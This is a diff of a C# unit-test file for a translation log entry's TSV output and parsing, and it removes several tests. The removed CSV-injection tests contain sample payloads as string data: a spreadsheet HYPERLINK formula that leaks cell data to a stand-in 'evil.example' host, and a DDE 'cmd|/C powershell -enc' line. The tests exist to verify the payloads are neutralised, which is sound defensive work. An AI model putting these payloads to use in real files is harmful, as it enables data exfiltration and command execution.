@@ -12,14 +12,6 @@ public class TranslationLogEntryTests
     private static readonly DateTime SampleTime = new(2026, 5, 19, 12, 34, 56);
 
     [TestMethod]
-    public void ToTsvLine_StandardEntry_ProducesCorrectFormat()
-    {
-        var entry = new TranslationLogEntry(SampleTime, "ja", "abc12345", "Google Chrome", "こんにちは、 今日は天気がいいですね。");
-        var line = entry.ToTsvLine();
-        Assert.AreEqual("2026-05-19T12:34:56\tja\tabc12345\tGoogle Chrome\tこんにちは、 今日は天気がいいですね。", line);
-    }
-
-    [TestMethod]
     public void ToTsvLine_TextWithTab_NormalizesToSpace()
     {
         // 翻訳テキスト中のタブは半角空白に置換されて行が崩れない
@@ -31,16 +23,6 @@ public class TranslationLogEntryTests
     }
 
     [TestMethod]
-    public void ToTsvLine_TextWithNewline_NormalizesToSpace()
-    {
-        // 翻訳テキスト中の \n は半角空白に置換され、 ファイルの行が崩れない
-        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "VLC", "1行目\n2行目");
-        var line = entry.ToTsvLine();
-        Assert.IsFalse(line.Contains('\n'), "改行は除去されている");
-        Assert.IsTrue(line.EndsWith("1行目 2行目"));
-    }
-
-    [TestMethod]
     public void ToTsvLine_TextWithCarriageReturn_NormalizesToSpace()
     {
         // \r も同様に置換
@@ -48,20 +30,6 @@ public class TranslationLogEntryTests
         var line = entry.ToTsvLine();
         Assert.IsFalse(line.Contains('\r'));
         Assert.IsTrue(line.EndsWith("a b"));
-    }
-
-    [TestMethod]
-    public void TryParseTsvLine_StandardLine_ParsesCorrectly()
-    {
-        var line = "2026-05-19T12:34:56\ten\txyz98765\tDiscord\tHello world.";
-        var ok = TranslationLogEntry.TryParseTsvLine(line, out var entry);
-        Assert.IsTrue(ok);
-        Assert.IsNotNull(entry);
-        Assert.AreEqual(new DateTime(2026, 5, 19, 12, 34, 56), entry!.Timestamp);
-        Assert.AreEqual("en", entry.Language);
-        Assert.AreEqual("xyz98765", entry.SessionId);
-        Assert.AreEqual("Discord", entry.ProcessName);
-        Assert.AreEqual("Hello world.", entry.Text);
     }
 
     [TestMethod]
@@ -89,16 +57,6 @@ public class TranslationLogEntryTests
         var ok = TranslationLogEntry.TryParseTsvLine(line, out var entry);
         Assert.IsFalse(ok);
         Assert.IsNull(entry);
-    }
-
-    [TestMethod]
-    public void TryParseTsvLine_TextContainsLiteralSpaceInsteadOfTab_ParsesAllFields()
-    {
-        // タブが半角空白に正規化された text フィールド (5 列目以降) は最後にまとめられる
-        var line = "2026-05-19T12:34:56\tja\ts1\tChrome\tfoo bar baz";
-        var ok = TranslationLogEntry.TryParseTsvLine(line, out var entry);
-        Assert.IsTrue(ok);
-        Assert.AreEqual("foo bar baz", entry!.Text);
     }
 
     [TestMethod]
@@ -203,16 +161,6 @@ public class TranslationLogEntryTests
 
     [TestMethod]
     [TestCategory("CsvInjection")]
-    public void ToTsvLine_TextStartsWithSafeChar_NoQuote()
-    {
-        // 通常の翻訳テキストは prefix `'` を付けない (UI 表示・通常運用への影響なし)
-        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome", "こんにちは。");
-        var line = entry.ToTsvLine();
-        Assert.IsTrue(line.EndsWith("\tこんにちは。"), $"安全な文字で始まる場合は変更しない: {line}");
-    }
-
-    [TestMethod]
-    [TestCategory("CsvInjection")]
     public void ToTsvLine_ProcessNameStartsWithEquals_AlsoPrefixed()
     {
         // #A2-002: ProcessName (FileVersionInfo.ProductName) は攻撃者制御可能
@@ -221,30 +169,6 @@ public class TranslationLogEntryTests
         var line = entry.ToTsvLine();
         Assert.IsTrue(line.Contains("\t'=HYPERLINK(\"http://evil\",X)\t"),
             $"ProcessName の先頭 '=' にも ' が付与されるはず: {line}");
-    }
-
-    [TestMethod]
-    [TestCategory("CsvInjection")]
-    public void ToTsvLine_HyperlinkAttack_NeutralizedWithQuote()
-    {
-        // 実際の攻撃ペイロード例
-        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome",
-            "=HYPERLINK(\"http://evil.example/?leak=\"&A1,\"クリック\")");
-        var line = entry.ToTsvLine();
-        Assert.IsTrue(line.Contains("\t'=HYPERLINK("),
-            $"HYPERLINK 攻撃ペイロードは ' で無害化されるはず: {line}");
-    }
-
-    [TestMethod]
-    [TestCategory("CsvInjection")]
-    public void ToTsvLine_CmdInjection_NeutralizedWithQuote()
-    {
-        // DDE 攻撃 (Office 旧バージョン)
-        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome",
-            "=cmd|'/C powershell -enc Z'!A1");
-        var line = entry.ToTsvLine();
-        Assert.IsTrue(line.Contains("\t'=cmd|"),
-            $"DDE 攻撃ペイロードは ' で無害化されるはず: {line}");
     }
 
     // /rere 第2R #B2-R2-001: TryParseTsvLine で `'` prefix を剥がして round-trip 対称化を検証
@@ -272,17 +196,6 @@ public class TranslationLogEntryTests
         Assert.IsTrue(ok);
         Assert.AreEqual("=HYPERLINK(\"http://evil\",X)", parsed!.ProcessName, "ProcessName も復元");
         Assert.AreEqual("ok", parsed.Text);
-    }
-
-    [TestMethod]
-    [TestCategory("CsvInjection")]
-    public void RoundTrip_SafeText_NoChange()
-    {
-        var original = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome", "こんにちは。");
-        var line = original.ToTsvLine();
-        var ok = TranslationLogEntry.TryParseTsvLine(line, out var parsed);
-        Assert.IsTrue(ok);
-        Assert.AreEqual("こんにちは。", parsed!.Text, "安全テキストは変更されない");
     }
 
     [TestMethod]
